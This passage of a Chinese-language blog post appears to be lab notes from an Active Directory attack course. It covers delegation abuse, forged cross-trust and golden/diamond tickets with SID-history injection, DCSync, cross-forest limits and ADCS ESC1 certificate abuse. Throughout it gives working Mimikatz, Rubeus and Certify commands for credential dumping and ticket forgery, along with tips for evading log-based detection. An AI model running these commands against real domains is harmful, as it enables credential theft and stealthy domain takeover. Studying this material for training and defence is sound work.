+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这里只是为了演示能加多个，实际只用了一个</span></span><br><span class="line"><span class="variable">$comps</span> = <span class="string">&#x27;dcorp-student1$&#x27;</span>,<span class="string">&#x27;dcorp-student2$&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-ADComputer</span> <span class="literal">-Identity</span> dcorp<span class="literal">-mgmt</span> <span class="literal">-PrincipalsAllowedToDelegateToAccount</span> <span class="variable">$comps</span></span><br></pre></td></tr></table></figure>
+
+<p>再提取对应被控制机器的aeskey，一会用</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-mimikatz</span> <span class="literal">-Command</span> <span class="string">&#x27;&quot;sekurlsa::ekeys&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用被控账户发起委派至目标( S4U2self + S4U2Proxy )，获取目标上高权用户的访问票据，注入到进程</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:dcorp<span class="literal">-student1</span><span class="variable">$</span> /aes256:xxxxxxxxx /msdsspn:http/dcorp<span class="literal">-mgmt</span> /impersonateuser:Administrator /ptt</span><br></pre></td></tr></table></figure>
+
+<p>访问到远程主机</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs <span class="literal">-r</span>:dcorp<span class="literal">-mgmt</span> cmd.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="10-跨域-Across-Trusts"><a href="#10-跨域-Across-Trusts" class="headerlink" title="10.跨域 Across Trusts"></a>10.跨域 Across Trusts</h3><p>跨域请求服务的流程</p>
+<ul>
+<li>1.客户端时间戳与用户密钥加密发送到子域KDC(as-req)</li>
+<li>2.子域KDC使用krbtgt加密TGT，然后发送给用户(as-rep)</li>
+<li>3.客户端用TGT向KDC请求访问服务的ST(tgs-req)</li>
+<li>4.KDC首先会检查客户端请求的服务主体是否在自己域内，如果不在自己域内，KDC将返回一张跨域票据（inter-realm referral TGT）<!-- 注意这张票据的内层是由目标域的 `krbtgt key` 加密的，并非本域 `krbtgt`  -->，而这张票据的最外层是由跨域信任密钥 <code>trust key</code> 加密的 <del>（如果在自己域内的话就走正常的tgs-rep了，KDC用服务的凭证加密ST，然后返回一张ST给客户端，虽然放在跨域这里部分并不重要但我还是写上了XD）</del>(tgs-rep)</li>
+<li>5.客户端使用第四步获取的跨域TGT，向服务所在域的DC请求服务ST，在这一步父域DC验证票据是否 可用的唯一标准是用户的跨域TGT能否被跨域密钥 <code>trust key</code> 解密。</li>
+<li>6.如果能被成功解密，父域或者目标域的kdc将会响应给客户端一张对应的服务票据（ST），<strong>这张票据由 <code>Trust key</code> 加密。</strong></li>
+<li>7.然后就可以访问跨域服务了</li>
+</ul>
+<p>在有域管理的情况下有多种方式获取到企业管理员 <code>Enterprise Admins</code> 权限</p>
+<p>比如，第6步的 跨域信任密钥 <code>trust key</code> 在可信的域控之间设置是始终相同的，只需要得到 <code>trust key</code> 就可以直接伪造第5步的TGT。</p>
+<p>要利用这一点，需要首先从当前所属域DC提取 <code>trust key</code> 的rc4 key，然后伪造 <code>referral tgt</code>，在其中票据中注入<code>sid history</code>属性，<code>sid history</code> 安全标识符指向 <code>519</code>（即企业管理员）。</p>
+<h4 id="1-SID-history"><a href="#1-SID-history" class="headerlink" title="1.SID history"></a>1.SID history</h4><p><code>sid history</code> 是为了用户从一个域移动到另一个域而设计的用户属性，当用户移动到一个新域时他会获得到一个新的sid(sid的前段是当前域sid，后段是域内账户的标识符sid)，而用户旧的域sid将会被复制到属性中或者添加到 <code>sid history</code> 属性中，利用这个特点有两种方式可以提升到企业管理员。</p>
+<ul>
+<li>1.使用 <code>trust key</code> 伪造第5步使用的跨域TGT，并注入 <code>sid history</code></li>
+<li>2.在本域使用 <code>krbtgt key</code> 伪造金票时多加个<code>sid history</code> 属性（与正常金票节点一样只是伪造TGT的时候多加了个sid history字段）</li>
+</ul>
+<h5 id="1-提取trust-key"><a href="#1-提取trust-key" class="headerlink" title="1.提取trust key"></a>1.提取trust key</h5><p>利用跨域信任密钥伪造跨域票据（referral TGT）写入 <code>sid history</code>，首先从子节点DC获取 <code>trust key</code>，这里有多种方式：</p>
+<ul>
+<li>枚举 Active Directory 域之间的信任关系，会返回信任密钥</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SafetyKatz.exe &quot;lsadump::trust /patch&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>dcsync提取域信任账户的hash</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SafetyKatz.exe &quot;lsadump::dcsync /user:dcorp\mcorp$&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在域控上导出当前域内所有域凭证，其中会包含 <code>trust key</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SafetyKtz.exe &quot;lsadump::lsa /patch&quot;</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-利用信任密钥伪造跨域TGT"><a href="#2-利用信任密钥伪造跨域TGT" class="headerlink" title="2.利用信任密钥伪造跨域TGT"></a>2.利用信任密钥伪造跨域TGT</h5><p>因为跨域TGT是使用信任密钥加密的，反过来这里也可以用信任密钥伪造第5步用的跨域TGT，并在里面注入<code>sid history</code>属性。</p>
+<p>信任密钥被存在<code>信任账户</code>账户中，<code>信任账户</code>被视为一个<code>机器账户</code>，在双方域控都同意的情况他的密钥每过三十天轮换一次（所以不如krbtgt那么持久）。</p>
+<p>（这里Rubeus的选项是sliver，我感觉应该是因为是由 <code>域信任账户</code> 的 <code>信任密钥</code> 伪造的 <code>跨域TGT票据</code> ，有点类似用<code>ap-req</code>阶段使用 <code>服务凭据</code> 伪造 <code>ST</code> ，于是给塞到了 <code>sliver</code> 里）</p>
+<p>伪造跨域TGT，并注入目标域的企业管理员sid到sid history属性。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe sliver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:&lt;trust key(NThash)&gt; /sid:&lt;当前domain sid&gt; /sids:&lt;目标域-企业管理员sid 例:S<span class="literal">-1-5-21-335606122-960912869-3279953914-519</span>&gt; /ldap /user:Administrator /nowarp </span><br></pre></td></tr></table></figure>
+
+<p>使用伪造的<code>跨域TGT(referral TGT )</code>请求目标域的目标服务ST，将返回的ST注入到当前进程</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgs /service:http/mcorp<span class="literal">-dc</span>.MONEYCORP.LOCAL /dc:mcorp<span class="literal">-dc</span>.MONEYCORP.LOCAL /ptt /ticket:&lt;上一步的跨域TGT&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以winrs访问到另一个域的目标服务了</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs <span class="literal">-r</span>:dcorp<span class="literal">-dc</span>.moneycorp.local</span><br></pre></td></tr></table></figure>
+
+<p>再say一次，对面DC只验证这张票能否被跨域信任密钥解密，能解密DC就认为票据没问题。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>silver</code></td>
+<td>使用 Rubeus 的 Silver Ticket 模块</td>
+</tr>
+<tr>
+<td><code>/rc4:17e8f4d3f4b46e95048a66a5dd890ee3</code></td>
+<td>NTLM 哈希（krbtgt 或服务账户的密钥）这里用的则是信任密钥</td>
+</tr>
+<tr>
+<td><code>/sid:S-1-5-21-719815819-37263689483917688648</code></td>
+<td>当前伪造用户所在的目标域 SID</td>
+</tr>
+<tr>
+<td><code>/sids:S-1-5-21-335606122-960912869-3279953914-519</code></td>
+<td>父域中 Enterprise Admins 组的 SID（提升权限）</td>
+</tr>
+<tr>
+<td><code>/ldap</code></td>
+<td>向当前域控请求 PAC 信息</td>
+</tr>
+<tr>
+<td><code>/user:Administrator</code></td>
+<td>要伪造的用户名</td>
+</tr>
+<tr>
+<td><code>/nowrap</code></td>
+<td>输出不换行（适用于脚本处理或直接注入）</td>
+</tr>
+</tbody></table>
+<p>要注意的是在做跨域攻击的时候，如果目标不是森林根域（最高层），那么也可以先给攻击对象（用户&#x2F;组）注入域管理员组的SID历史（512表示Domain Admins的RID），这样就获得了目标域管理员权限。在到达林根时，可以注入企业管理员的SID历史，获得更高级权限。</p>
+<p>所以可以看下域林</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADForest</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h5 id="3-利用当前域krbtgt-key-伪造TGT并注入-sid-history（等同构造金票时候里面加个sid-history属性）"><a href="#3-利用当前域krbtgt-key-伪造TGT并注入-sid-history（等同构造金票时候里面加个sid-history属性）" class="headerlink" title="3.利用当前域krbtgt key 伪造TGT并注入 sid history（等同构造金票时候里面加个sid history属性）"></a>3.利用当前域krbtgt key 伪造TGT并注入 <code>sid history</code>（等同构造金票时候里面加个sid history属性）</h5><p>这种比上一种方便许多，不用再拿着跨域TGT挨个再请求服务票（ST）了。</p>
+<p>就在本域伪造个金票，然后多注入一个sid history属性就行，后面本域DC发现要请求的资源是其他域的，于是在DC去生成跨域TGT的时候，会用到本来的TGT，所以自然会把注入的sid history给带进去。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SafetyKatz.exe <span class="string">&quot;kerberos::golden /user:Administrator /domian:dollarcorp.moneycorp.local /sid:&lt;当前域SID&gt; /sids:&lt;目标域+伪造角色的RID 例:S-1-5-21-335606122-960912869-3279953914-519&gt; /krbtgt:xxxxxxxxx /ptt&quot;</span> <span class="string">&quot;exit&quot;</span> </span><br></pre></td></tr></table></figure>
+
+<p>然后直接访问目标域的服务就ok</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs <span class="literal">-r</span>:mcorp<span class="literal">-dc</span> cmd</span><br></pre></td></tr></table></figure>
+
+<h5 id="4-检测点绕过"><a href="#4-检测点绕过" class="headerlink" title="4.检测点绕过"></a>4.检测点绕过</h5><p>当在林根域DC告警中看到有一个来自子域的账户触发了4672（有一个有企业管理员权限或域管权限的账户进行登陆了），说明有人以高权身份跨域过来了。</p>
+<p>这里课程中提供了一种思路，当一个来自子域的用户伪造跨域的域管或企业管理员身份会被检测到，但如果一个子域的域控，伪造目标域的域控组和企业管理组的身份发起访问对则不会被轻易检测到。</p>
+<p><del>这就像来自乡下的我进京怎么装都会被察觉到贫穷的气息，但如果是我们乡长进京那怎么装b都难以被察觉出破绽，那高低也算是个人物（x</del></p>
+<p>所以，这里伪造金票的用户要用本域的dc，所以要加域控的id，因为是机器账户所以注入的 <code>sid history</code> 则是目标域的域控组(<code>516</code>)和企业管理控制器组(<code>S-1-5-9</code>)</p>
+<p>mimikatz</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SafetyKatz.exe <span class="string">&quot;kerberos::golden /user:dcorp-dc<span class="variable">$</span> /id:1000 /domain:dollarcorp.moneycorp.local /sid:s-1-5-21-7198158193726368948-3917688648 /sids:s-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Rubeus</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe golden /user:dcorp<span class="literal">-dc</span><span class="variable">$</span> /id:<span class="number">1000</span> /domian:dollarcorp.moneycorp.local /aes256:xxxxxxxxxx /sid:s<span class="literal">-1-5-21-7198158193726368948-3917688648</span> /sids:s<span class="literal">-1-5-21-335606122-960912869-3279953914-516</span>,S<span class="literal">-1-5-9</span> /dc:DCORP<span class="literal">-DC</span>.dollarcorp.moneycorp.local /ptt</span><br></pre></td></tr></table></figure>
+
+<h6 id="钻石票"><a href="#钻石票" class="headerlink" title="钻石票"></a>钻石票</h6><p>和正常流程中的票据完整度一样，同样这里钻石票自然要比金票在流程上更不容易被检出。站在简易度和opsec的角度钻石票应该是最优解（蓝宝石票需要先去获得一个合法pac，流程会变长许多）</p>
+<p>Rubeus</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe diamond /krbkey:xxxxx /tgtdeleg /enctype:aes /ticketuser:dcorp<span class="literal">-dc</span><span class="variable">$</span> /domian:dollarcorp.moneycorp.local /dc:dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local /tickeruserid:<span class="number">1000</span> /sids:s<span class="literal">-1-5-21-335606122-960912869-3279953914-516</span>,S<span class="literal">-1-5-9</span>&lt;目标域控组和域企业控制组&gt; /createnetonly:C:\windows\system32\cmd.exe /show /ptt</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>但要注意，以本域域控伪造跨域的域控组权限之后，为了避免被检测到诡异的异常行为，不能以交互式的方式（比如winrs等）登录到林根的任何机器，建议是执行dcsync，域控之间dcsync这很正常(任何一个域用户执行dcsync都会显得异常)，所以这样就可以绕过日志监测。</p>
+<p>dcsync</p>
+<p>powershell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SafetyKatz.exe &quot;lsadump::dcsync /user:mcorp\krbtgt /domian:moneycorp.local&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="11，跨外部信任（林）域-Across-External-Trust"><a href="#11，跨外部信任（林）域-Across-External-Trust" class="headerlink" title="11，跨外部信任（林）域 Across External Trust"></a>11，跨外部信任（林）域 Across External Trust</h3><p>在两个林中存在sid过滤机制，具体表现为在跨信任域或跨林流程时，跨域TGT票据中的 <code>sid history</code> 字段如果sid是500-1000，第5步发送给对面域林的DC时这个字段将会被抹除，尽管票据被验证为合法的仍可以正常使用，但是无法伪造sid history了。</p>
+<p>除非对面域林配置错了一个1104的域企业管理员组，那此时 <code>sid history</code> 可以伪造一个1104，因为不在500-1000，所以这不会被过滤（笑</p>
+<h4 id="1-可利用点"><a href="#1-可利用点" class="headerlink" title="1.可利用点"></a>1.可利用点</h4><p>如果在明确了另一个林域给了一个可访问资源，并限制了本域访问可访问的用户，那就可以利用，尽管很有限。</p>
+<p>比如 <code>eurocorp.local</code> 域的DC共享了一个 <code>SharedwithDCorp</code> 网络文件夹，并且这个只给当前我们所处域 <code>dollarcorp.moneycorp.local</code> 的DA（域管）权限访问。</p>
+<p>提取跨域密钥</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SafetyKatz.exe <span class="string">&quot;lsadump::dcsync /user:dcorp\eucorp<span class="variable">$</span>&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>先用刚才在同一个林中交互的跨域TGT伪造的命令，看下区别</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe sliver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:&lt;trust key(NThash)&gt; /sid:&lt;当前domain sid&gt; /sids:&lt;目标域-企业管理员sid 例:S<span class="literal">-1-5-21-335606122-960912869-3279953914-519</span>&gt; /ldap /user:Administrator /nowarp </span><br></pre></td></tr></table></figure>
+
+<p>当使用信任密钥，伪造了这个跨域TGT票据，会发现即便是知道要删，但是上面命令中写入了企业管理员的sid history（为了演示 XD）</p>
+<p>把tgt发过去做 <code>tgs-req</code> </p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgs service:cifs/eucorp<span class="literal">-dc</span>.eurocorp.local /dc:eucorp<span class="literal">-dc</span>.eurocorp.loca /ptt/ticket:&lt;FORGED TICKET&gt;</span><br></pre></td></tr></table></figure>
+
+<p>对面林DC在接到tgt后，会解密票据并直接删掉 跨域TGT 其中的 <code>sid history</code> 部分，甚至对面DC的日志中会有一条记录，记录sids已被删除。</p>
+<p>所以这个sids如果在1000以内的话，跨林时候sids其实就没啥必要带了，<strong>所以能做的只是以当前域的管理员身份访问</strong>。</p>
+<p>直接用下面命令单纯伪造一个本域的域管的跨域TGT就好</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe sliver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:&lt;trust key(NThash)&gt; /sid:&lt;当前domain sid&gt;  /ldap /user:Administrator /nowarp </span><br></pre></td></tr></table></figure>
+
+<p>所以那其实直接伪造个金票，拿域管理员去访问可能会更方便些。</p>
+<h4 id="2-枚举资源服务"><a href="#2-枚举资源服务" class="headerlink" title="2.枚举资源服务"></a>2.枚举资源服务</h4><p>和刚才一样，因为无法得知另一个林域内机器开启了什么样的服务，只能挨个机器挨个服务枚举。</p>
+<p>比如刚才拿到了 <code>eucorp-dc.eurocorp.local</code> ，只能访问一个目录 <code>SharedwithDCorp</code> ，当访问 <code>c$</code> 都会被拒绝</p>
+<p>可以通过 <code>net view</code> 来看有哪些</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view \\eudcorp.eurocorp.local\</span><br></pre></td></tr></table></figure>
+
+<p>如果要枚举对面林中某哥机器是否有能用的服务，就需要修改下面这个中的 <code>服务</code> 和 <code>机器名</code>，然后不断的请求不断地枚举尝试…</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgs service:cifs/eucorp<span class="literal">-dc</span>.eurocorp.local /dc:eucorp<span class="literal">-dc</span>.eurocorp.loca /ptt/ticket:&lt;FORGED TICKET&gt;</span><br></pre></td></tr></table></figure>
+
+<p>因为资源对于我们而言不是明确的，而且林与林之间资源的分享都是需要手动配置，配置的都是还是最小化的资源单位，比如smb可能只会共享一个目录，在没有文档或者别的提示的情况下，就连这个机器上的cifs服务也需要手动枚举才能发现，“这个机器给我共享了一个cifs”。</p>
+<hr>
+<h2 id="10-ADCS"><a href="#10-ADCS" class="headerlink" title="10 ADCS"></a>10 ADCS</h2><p>adcs是 <code>Active directory 证书服务</code>，是微软对于PKI（一种公钥设施）的一种实现。</p>
+<p>adcs 可以用对用户、机器做身份认证，给电子邮件签名加密和签名邮件等等</p>
+<p>在微软文档中，他介绍ADCS被视作一个服务器角色，相当于构建一个pki设施，为组织提供公钥加密、数字证书、数字签名等功能。</p>
+<p>这涉及到一些概念：</p>
+<ul>
+<li>CA —— 颁发证书的认证机构，在adcs的情况下具有adcs规则的服务器即为CA（不过现在基本都在DC上了）</li>
+<li>Certificate —— 证书可以被视为颁发给用户、机器的一段代码，它用于验证身份、加密、签署文件等</li>
+<li>CSR —— 证书签名请求，是指客户端向CA发起的证书签名请求，用于请求证书。</li>
+<li>Certificate Template —— 证书模板，定义证书的设置，包含：证书何时到期，谁可以注册，谁可以为了什么申请证书，这张证书用于做什么，用于身份验证还是加密文件等等，包含了对一个证书的定义。</li>
+<li>EKU OIDs —— 全称是 <code>Extended Key Usages Object Identifiers</code> ,定义了证书的用途：身份验证、智能卡、文件加密等等，这个通常包含在证书模板里。</li>
+</ul>
+<h3 id="1-流程"><a href="#1-流程" class="headerlink" title="1.流程"></a>1.流程</h3><ul>
+<li>1.客户端生成一个公私钥对</li>
+<li>2.向企业CA 发送证书签名请求（CSR）</li>
+<li>3.CA检查证书模板是否存在，CSR中的设置是否被证书模板所允许，用户是否被允许注册这个证书</li>
+<li>4.CA确定ok后，会用CA私钥对这张证书签名，然后将其发送给用户</li>
+<li>5.客户端将证书存储在Windows证书存储中，用户然后做符合EKU OID行为的时候会用到这个证书。</li>
+</ul>
+<h3 id="2-利用点"><a href="#2-利用点" class="headerlink" title="2.利用点"></a>2.利用点</h3><p>比较多</p>
+<ul>
+<li>通过证书提取目标nthash</li>
+<li>证书默认过期时间是一年，即便用户改掉了自己账户密码，证书也依旧可以用，所以用来持久化</li>
+<li>用来提权</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>窃取证书</th>
+<th>持久化</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>使用windows加密API导出私钥和证书</td>
+<td>如果对一个证书有注册权限，可以通过请求新证书来保证用户权限维持</td>
+</tr>
+<tr>
+<td>2</td>
+<td>使用DPAPI提取用户证书及其私钥</td>
+<td>通过请求新的证书来实现主机持久化</td>
+</tr>
+<tr>
+<td>3</td>
+<td>使用DPAPI提取机器证书及其私钥</td>
+<td>通过续期证书，实现对用户或机器账户的持久化控制</td>
+</tr>
+<tr>
+<td>4</td>
+<td>如果证书标记为可导出，则可通过powershell等从文件和存储中导出PFX证书</td>
+<td></td>
+</tr>
+<tr>
+<td>5</td>
+<td>使用PKINIT获取ntlmhash</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>以及，如果泄露了CA私钥，将可以使用其解密所有证书，然后导出他颁发的所有证书。</p>
+<p>然后是配置错误等导致的，ESC1-ESC15</p>
+<table>
+<thead>
+<tr>
+<th>ESC1</th>
+<th>ESC2</th>
+<th>ESC3</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>申请者（Enrollee）可以为任意用户申请证书，并且当前还有这个证书的注册权限。（需要注意EKU的范围，或者没有）</td>
+<td>允许被用于任何目的，或者没有EKU（会被应用于任何场景）</td>
+<td>请求一个注册代理证书（Enrollment Agent Certificate），然后用它代表任意用户申请证书。</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>ESC4</th>
+<th>ESC5</th>
+<th>ESC6</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>过度允许的在模板上使用ACL（导致修改模板）</td>
+<td>对证书颁发机构（CA 服务器）或其计算机对象的访问控制配置不当。</td>
+<td>CA 启用了EDITF_ATTRIBUTE_SUBJECTALTNAME2，攻击者模仿用户（比如域管）的 SAN，申请用于身份认证的证书，伪装成任何人登录域。</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>ESC7</th>
+<th>ESC8</th>
+<th>ESC9</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>对 CA 权限角色（比如 CA Administrator 和 Certificate Manager）的访问控制配置不严格、不安全。</td>
+<td>中继NTLM请求到http的证书注册端点</td>
+<td>在没有安全拓展的情况下攻击者修改自己的UPN和用户名，以伪造身份代表任何用户请求证书</td>
+</tr>
+</tbody></table>
+<p>实际比较常见的ESC是：1、3、4、5、7、8</p>
+<p>接下来的都是特定情况下的</p>
+<blockquote>
+<p>证书有显式映射与隐式映射</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>ESC10</th>
+<th>ESC11</th>
+<th>ESC12</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>如果存在隐式证书映射，则申请者可以修改自己的 UPN，从而代表任何用户申请证书（和ESC9有些类似）</td>
+<td>NTLM中继到RPC注册端点（非默认开启）</td>
+<td>从 Yubico 的 YubiHSM（硬件安全模块）里窃取 CA（证书颁发机构）的私钥。</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>ESC13</th>
+<th>ESC14</th>
+<th>ESC15</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>证书模板配置了关联组，申请者有权申请这个证书，将获得与证书模板关联的安全组（linked group）的权限</td>
+<td>利用证书会引用目标对象属性中的 altSecurityIdentities 字段，实现以该目标身份进行身份认证(HTB 的Scepter有用到)。</td>
+<td>滥用旧版（版本1）证书模板可以绕过 EKU 限制，让证书用于更多不该有的身份验证等操作。</td>
+</tr>
+</tbody></table>
+<hr>
+<p><strong>CA权限维持</strong></p>
+<ul>
+<li>伪造证书使用被盗的CA私钥密钥。</li>
+<li>恶意的证书颁发机构恶意的根证书颁发机构（Root CA）或中间证书颁发机构（Intermediate CA）。</li>
+<li>后门CA服务或后门CA机器。</li>
+</ul>
+<hr>
+<h3 id="3-枚举ADCS"><a href="#3-枚举ADCS" class="headerlink" title="3.枚举ADCS"></a>3.枚举ADCS</h3><p>在当前林中枚举ADCS</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe cas</span><br></pre></td></tr></table></figure>
+
+<p>枚举证书模板</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe find</span><br></pre></td></tr></table></figure>
+
+<p>枚举可能存在漏洞的证书</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe find /vulnertable</span><br></pre></td></tr></table></figure>
+
+<p>枚举ESC1 （为任何用户申请证书）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe find /enrolleeSuppliesSubject</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-利用示例"><a href="#4-利用示例" class="headerlink" title="4.利用示例"></a>4.利用示例</h3><p>利用ESC1 申请一张administrator的证书</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe request /ca:mcorp<span class="literal">-dc</span>.moneycorp.local moneycorp<span class="literal">-MCORP-DC-CA</span> /template:<span class="string">&quot;HTTPscertificates&quot;</span></span><br><span class="line">/altname:administrator</span><br></pre></td></tr></table></figure>
+
+<p>将证书复制下来到txt中，然后通过openssl转换为fpx，会需要输入密码，一会rubeus用的时候也要附上密码（转换的方式比较多，看个人喜好了，我习惯openssl和certipy轮换着用）</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl.exe pkcs12 C:\AD\Tools\esc1.pem <span class="literal">-keyex</span> <span class="literal">-CSP</span> <span class="string">&quot;Microsoft Enhanced cryptographic Provider v1.0&quot;</span> <span class="literal">-export</span> <span class="literal">-out</span> C:\AD\Tools\esc1<span class="literal">-DA</span>.pfx</span><br></pre></td></tr></table></figure>
+
+<p>使用pfx证书，请求tgt注入到进程中</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:administrator /certificate:C:\AD\Tools\esc1<span class="literal">-DA</span>.pfx /password:test@<span class="number">123</span> /ptt</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>ESC1 提权至企业管理员</strong></p>
+<p>和刚才管理员是一样的，只不过altname需要指定为林根域的administrator</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe request /ca:mcorp<span class="literal">-dc</span>.moneycorp.local moneycorp<span class="literal">-MCORP-DC-CA</span> /template:<span class="string">&quot;HTTPscertificates&quot;</span></span><br><span class="line">/altname:moneycorp.local\administrator</span><br></pre></td></tr></table></figure>
+
+<p>后面还是一样的，转换票据，注入进程</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl.exe pkcs12 C:\AD\Tools\esc1.pem <span class="literal">-keyex</span> <span class="literal">-CSP</span> <span class="string">&quot;Microsoft Enhanced cryptographic Provider v1.0&quot;</span> <span class="literal">-export</span> <span class="literal">-out</span> C:\AD\Tools\esc1<span class="literal">-DA</span>.pfx</span><br></pre></td></tr></table></figure>
+
+<p>使用pfx证书，请求tgt注入到进程中，因为是要和林域交互，所以注意这里user也需要指定为林根的user，以及dc这里也需要指定到林根的dc，才能获取到林根的企业管理员administator。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:moneycorp.local\administrator /dc:mcorp<span class="literal">-dc</span>.moneycorp.local /certificate:C:\AD\Tools\esc1<span class="literal">-DA</span>.pfx /password:test@<span class="number">123</span> /ptt</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以访问林根的dc了</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs <span class="literal">-r</span>:mcorp<span class="literal">-dc</span> cmd</span><br></pre></td></tr></table></figure>
+
+<h2 id="11-SQL-server-Trust-Abuse"><a href="#11-SQL-server-Trust-Abuse" class="headerlink" title="11.SQL server Trust Abuse"></a>11.SQL server Trust Abuse</h2><blockquote>
